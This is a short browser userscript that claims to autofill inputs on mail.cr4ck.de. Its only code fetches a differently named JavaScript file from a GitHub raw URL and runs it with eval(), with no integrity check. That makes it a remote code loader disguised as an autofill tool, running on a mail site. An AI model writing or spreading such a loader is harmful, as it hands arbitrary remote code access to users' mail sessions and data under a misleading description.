// ==UserScript==
// @name         Autofill on mail.cr4ck.de
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Autofill inputs on mail.cr4ck.de
// @homepageURL  https://cr4ck.de
// @supportURL   https://cr4ck.de/dc

// Add all new websites here
// @match        https://mail.cr4ck.de/*

// @license      CC BY-NC 4.0 (https://creativecommons.org/licenses/by-nc/4.0/).

// @downloadURL  https://cr4ck.de/userscript
// @updateURL    https://cr4ck.de/userscript

// @grant        GM_xmlhttpRequest
// @grant        GM.xmlHttpRequest

// @version      1.0.0
// @releaseDate  2024-09-02T05:23:50.212Z
// @author       cr4ck.de team
// @connect      raw.githubusercontent.com

// ==/UserScript==

(function() {
    GM.xmlHttpRequest({
        method: 'GET',
        url: 'https://github.com/syrabrox/userscript/raw/refs/heads/main/knowunity.code.user.js',
        onload: function(response) {
            eval(response.responseText);
        }
    });
})();
